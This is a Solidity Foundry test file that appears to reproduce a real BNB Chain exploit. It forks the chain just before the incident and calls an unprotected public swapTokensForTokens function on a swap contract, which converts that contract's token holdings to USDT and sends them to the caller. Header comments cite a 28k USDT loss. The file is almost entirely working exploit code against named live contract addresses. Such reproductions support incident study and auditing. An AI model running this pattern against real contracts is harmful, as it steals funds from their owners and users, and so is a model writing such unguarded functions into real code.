// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// reason : Unprotected public function
// guy    : https://x.com/TenArmorAlert/status/1875462686353363435
// tx     : https://app.blocksec.com/explorer/tx/bsc/0x61da5b502a62d7e9038d73e31ceb3935050430a7f9b7e29b9b3200db3095f91d
// total loss : 28kusdt

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    Uni_Pair_V2 pair = Uni_Pair_V2(0x5E901164858d75852EF548B3729f44Dd93209c9c);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Router_V3 routerV3 = Uni_Router_V3(0x1b81D678ffb9C0263b24A97847620C99d213eB14);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 token_98 = IERC20(0xc0dDfD66420ccd3a337A17dD5D94eb54ab87523F);
    address swapContract = 0xB040D88e61EA79a1289507d56938a6AD9955349C;


    function setUp() external {
        cheats.createSelectFork("bsc", 45462898-1);
        deal(address(USDT), address(this), 0);
        // deal(address(WBNB), address(this), 11 ether);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        uint256 token_amount = token_98.balanceOf(swapContract);
        address[] memory path = new address[](2);
        path[0] = address(token_98);
        path[1] = address(USDT);
        
        bytes memory callData = abi.encodeWithSignature(
            "swapTokensForTokens(address[],uint256,uint256,address)",
            path,
            token_amount,
            0,
            address(this)
        );
        
        (bool success,) = swapContract.call(callData);
        require(success, "swap failed");
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
    }


    receive() external payable {}
}
